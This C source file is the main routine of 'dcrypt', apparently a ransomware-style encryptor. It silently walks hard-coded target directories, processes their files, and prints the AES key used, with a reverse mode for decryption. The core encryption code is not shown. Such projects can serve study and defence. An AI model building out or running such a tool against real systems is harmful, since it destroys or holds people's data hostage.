#include "dcrypt.h"

#ifdef _WIN32
t_windows	win_env = {0};
#endif

void print_results(t_env *env)
{
	#ifdef _WIN32
	const char	*msg = "Successfully processed %lld file(s).\n";
	# else
	const char	*msg = "Successfully processed %ld file(s).\n";
	#endif

	printf("\n=======================================\n" FMT_INFO);
	printf(msg, env->handled_file_count);

	if (env->modes & DC_REVERSE && env->decryption_key)
		printf(FMT_INFO "Used key: %s\n", env->decryption_key);
	else if (env->encryption_key)
		#ifdef _WIN32
		printf(FMT_INFO "Used key: %s\n", env->encryption_key);
		# else
		print_hex(FMT_INFO "Used key", env->encryption_key, DC_AES_KEY_SIZE);
		#endif
}

int main(int argc, char *argv[])
{
	static t_env	env;

	// Detect first silent mode
	detect_silent_mode(&env, argc, argv);

	// Parse the arguments given through the commannd line
	parse_argv(&env, argc, argv);

	// Declare the injection target directory paths
	char *target_dir_paths[DC_TARGET_ARRAY_SIZE] = DC_TARGET_PATHS;

	// Open each target directory one by one
	for (size_t i = 0; i < DC_TARGET_ARRAY_SIZE; ++i)
		handle_dir(&env, target_dir_paths[i]);

	print_results(&env);

	// Free the key if memory has been allocated
	if (env.key_allocated)
	{
		free((void *)env.encryption_key);
		env.encryption_key = NULL;
	}
}
